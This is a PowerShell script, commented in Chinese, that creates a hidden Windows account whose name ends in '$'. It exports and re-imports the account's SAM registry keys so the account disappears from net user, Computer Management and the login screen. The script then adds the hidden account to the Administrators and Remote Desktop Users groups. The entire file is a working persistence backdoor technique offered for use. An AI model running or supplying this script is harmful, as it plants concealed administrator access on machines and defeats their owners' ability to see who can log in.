#生成隐藏用户脚本,需要管理员权限运行
#Usage:CreateUser.ps1 <username> <password> 
#用户名使用$结尾
#创建的用户在计算机管理界面,net user,登陆界面不可见.当隐藏用户处于登陆状态时，用户在登陆界面可见
param(
    [string] $user,
    [string] $pwd
)
$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
$checkname = $user -match '.+\$$'
if(-not $checkname){
    Write-Host "Username should end with '$'"
    exit
}
$exist = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $user}
if($exist){
    Write-Host "$user already existed"
    exit
}
$is_admin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
if(-not $is_admin){
    Write-Host "Administrator privileged need"
    exit
}
net user $user $pwd /add | Out-Null
cmd /c "regedit /e $env:temp\$user.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user"" | Out-Null
$file = Get-Content "$env:temp\$user.reg"  | Out-String
$pattern="@=hex\((.*?)\)\:"
$file -match $pattern |Out-Null
$key = "00000"+$matches[1]
cmd /c "regedit /e $env:temp\$key.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$key"" | Out-Null
net user $user /del | Out-Null
cmd /c "regedit /s $env:temp/$user.reg" | Out-Null
cmd /c "regedit /s $env:temp/$key.reg" | Out-Null
Remove-Item $env:temp/$user.reg
Remove-Item $env:temp/$key.reg
net localgroup "Administrators" $user /add  | Out-Null
net localgroup "Remote Desktop Users" $user /add | Out-Null